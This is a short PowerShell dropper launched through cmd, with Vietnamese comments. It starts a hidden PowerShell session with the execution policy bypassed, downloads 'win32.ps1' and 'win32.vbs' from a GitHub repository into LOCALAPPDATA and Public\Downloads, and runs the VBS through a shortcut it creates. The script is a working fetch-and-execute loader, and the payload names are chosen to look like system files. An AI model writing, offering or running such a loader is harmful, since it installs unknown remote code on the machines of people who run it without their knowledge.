cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command
$LocalPathPS1 = `$env:LOCALAPPDATA
$LocalPathVBS = `"C:\Users\Public\Downloads`"

# Kiểm tra và tạo thư mục nếu chưa tồn tại
if (!(Test-Path -Path `$LocalPathVBS)) {
    New-Item -ItemType Directory -Path `$LocalPathVBS -Force
}

# URLs tải file
$File1Url = `"https://github.com/KevinDark5/data/raw/refs/heads/main/win32.ps1`"
$File2Url = `"https://github.com/KevinDark5/data/raw/refs/heads/main/win32.vbs`"

# Tên file
$File1Name = `"win32.ps1`"
$File2Name = `"win32.vbs`"

# Đường dẫn đầy đủ để lưu file
$File1Path = Join-Path -Path `$LocalPathPS1 -ChildPath `$File1Name
$File2Path = Join-Path -Path `$LocalPathVBS -ChildPath `$File2Name

# Tải file win32.ps1 vào LOCALAPPDATA
Invoke-WebRequest -Uri `$File1Url -OutFile `$File1Path

# Tải file win32.vbs vào Public\Downloads
Invoke-WebRequest -Uri `$File2Url -OutFile `$File2Path

# Tạo shortcut cho win32.vbs trong Public\Downloads
$ShortcutPath = Join-Path -Path `$LocalPathVBS -ChildPath `"win32.lnk`"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = `$WScriptShell.CreateShortcut(`$ShortcutPath)
$Shortcut.TargetPath = `$File2Path
$Shortcut.Save()

# Thực thi shortcut
Start-Process `$ShortcutPath"
